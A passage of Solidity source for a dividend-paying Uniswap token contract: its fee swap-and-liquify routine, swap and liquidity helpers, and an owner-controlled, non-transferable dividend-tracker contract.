        uint256 initialETHBalance = address(this).balance;

        uint256 amountToLiquify = (contractBalance * _liquidityFee) /
            _totalFee /
            2;
        uint256 amountForHolders = (contractBalance * _holdersFee) / _totalFee;
        uint256 amountToSwap = contractBalance -
            (amountToLiquify + amountForHolders);

        _swapTokensForETH(amountToSwap);

        uint256 ETHBalanceAfterSwap = address(this).balance - initialETHBalance;
        uint256 totalETHFee = _totalFee -
            ((_liquidityFee / 2) + _burnFee + _holdersFee);
        uint256 amountETHLiquidity = (ETHBalanceAfterSwap * _liquidityFee) /
            totalETHFee /
            2;
        uint256 amountETHEcosystem = ETHBalanceAfterSwap - (amountETHLiquidity);

        payable(daoWallet).transfer(amountETHEcosystem);

        if (amountToLiquify > 0) {
            _addLiquidity(amountToLiquify, amountETHLiquidity);
            emit SwapAndLiquify(
                amountToSwap,
                amountETHLiquidity,
                amountToLiquify
            );
        }

        bool success = IERC20(address(this)).transfer(
            address(spectrumAIAsset),
            amountForHolders
        );
        if (success) {
            spectrumAIAsset.distributeDividendsUsingAmount(amountForHolders);
            emit DividendsSent(amountForHolders);
        }
    }

    function _swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function _addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            liquidityWallet,
            block.timestamp
        );
    }
}

contract sAITrack is sAIAssetToken {
    using SafeMath for uint256;
    using SafeMathInt for int256;

    mapping(address => bool) public excludedFromDividends;
    mapping(address => uint256) public lastClaimTimes;
    uint256 public claimWait;
    uint256 public minimumTokenBalanceForDividends;

    event ExcludeFromDividends(address indexed account);
    event ClaimWaitUpdated(uint256 indexed newValue, uint256 indexed oldValue);
    event Claim(
        address indexed account,
        uint256 amount,
        bool indexed automatic
    );

    constructor() sAIAssetToken("www.spectrumai.gg", "sAITrack") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 0 * (10**18);
    }

    function setRewardToken(address token) external onlyOwner {
        _setRewardToken(token);
    }

    function setUniswapRouter(address router) external onlyOwner {
        _setUniswapRouter(router);
    }

    function _transfer(
        address,
        address,
        uint256
    ) internal pure override {
        require(false, "No transfers allowed");
    }

    function excludeFromDividends(address account) external onlyOwner {
        require(!excludedFromDividends[account]);
        excludedFromDividends[account] = true;
        _setBalance(account, 0);
        emit ExcludeFromDividends(account);
    }

    function setTokenBalanceForDividends(uint256 newValue) external onlyOwner {
        require(
            minimumTokenBalanceForDividends != newValue,
            "minimumTokenBalanceForDividends already the value of 'newValue'."
        );
        minimumTokenBalanceForDividends = newValue;
    }

    function setBalance(address payable account, uint256 newBalance)
        external
        onlyOwner
    {
        if (excludedFromDividends[account]) {
            return;
        }
        if (newBalance >= minimumTokenBalanceForDividends) {
            _setBalance(account, newBalance);
        } else {
            _setBalance(account, 0);
        }
        processAccount(account, true);
    }

    function processAccount(address payable account, bool automatic)
        public
        onlyOwner
        returns (bool)
    {
        uint256 amount = _withdrawDividendOfUser(account);
        if (amount > 0) {
            lastClaimTimes[account] = block.timestamp;
            emit Claim(account, amount, automatic);
            return true;
        }
        return false;
    }
}